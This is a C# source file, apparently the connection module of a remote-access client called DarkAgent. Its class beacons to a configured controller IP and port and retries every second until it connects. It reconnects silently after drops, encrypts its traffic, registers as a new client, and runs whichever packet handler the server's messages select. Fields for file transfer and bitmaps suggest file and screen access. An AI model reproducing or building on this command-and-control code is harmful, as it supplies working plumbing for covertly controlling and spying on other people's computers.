using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using DarkAgent_Client.src.Objects;
using System.Drawing;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;
using DarkAgent_Client.src.Network.DataNetwork.Packets;
using DarkAgent_Client.src.Engines;
using System.Net;
using DarkAgent_Client.src.Utils;
using System.IO;
using System.Threading;
using DarkAgent_Client.src.Network.FileNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork
{
    public class ClientConnect
    {
        public static Socket _client;
        private static byte[] _buffer;
        public SortedList<int, FileTransfer> fileTransfer;
        public Bitmap PrevImage;


        public ClientConnect()
        {
            fileTransfer = new SortedList<int, FileTransfer>();
            TryToConnect();
        }

        private void Read()
        {
            _buffer = new byte[2];
            _client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, Client_BeginReceive, null);
        }

        private void Client_BeginReceive(IAsyncResult ar)
        {
            try
            {
                if (_client.EndReceive(ar) > 0)
                {
                    _buffer = new byte[BitConverter.ToInt16(_buffer, 0) - 2];

                    if (_buffer.Length > 10000) //ignore packets that are bigger then 10kb
                        return;

                    if (_buffer.Length > 0)
                    {
                        _client.Receive(_buffer, 0, _buffer.Length, SocketFlags.Partial);

                        _buffer = CryptEngine.Crypt(_buffer);

                        //Process the packet.
                        Type pck = ClientPacketProcessor.ProcessPacket(_buffer);
                        if (pck != null)
                        {
                            ReceiveBasePacket rbp = (ReceiveBasePacket)Activator.CreateInstance(pck, this, _buffer);
                            rbp.Run();
                        }

                        Read();
                        return;
                    }
                }
            }
            catch
            {
                if(!_client.Connected)
                    TryToConnect();
            }
        }

        private static void Disconnect()
        {
            _client.Disconnect(false);
        }

        private void TryToConnect()
        {
            _client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            if (!_client.Connected)
            {
                while (!_client.Connected)
                {
                    System.Threading.Thread.Sleep(1000);
                    try
                    {
                        _client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        _client.Connect(new IPEndPoint(IPAddress.Parse(Settings.ConnectIP), Settings.ConnectPort));
                    }
                    catch { }
                }
            }
            Read();
            SendPacket(new S_NewClient(this));
        }

        public void SendPacket(SendBasePacket packet)
        {
            lock(this)
            {
                packet.Write();
                byte[] pck = CryptEngine.Crypt(packet.ToByteArray());

                if (packet.Length > 60000)
                    return;

                List<Byte> FullPacket = new List<Byte>();
                FullPacket.AddRange(BitConverter.GetBytes((short)(pck.Length + 2))); //+2 Packet Length
                FullPacket.AddRange(pck); //Packet
                try
                {
                    _client.Send(FullPacket.ToArray());
                } catch {}
            }
        }
    }
}
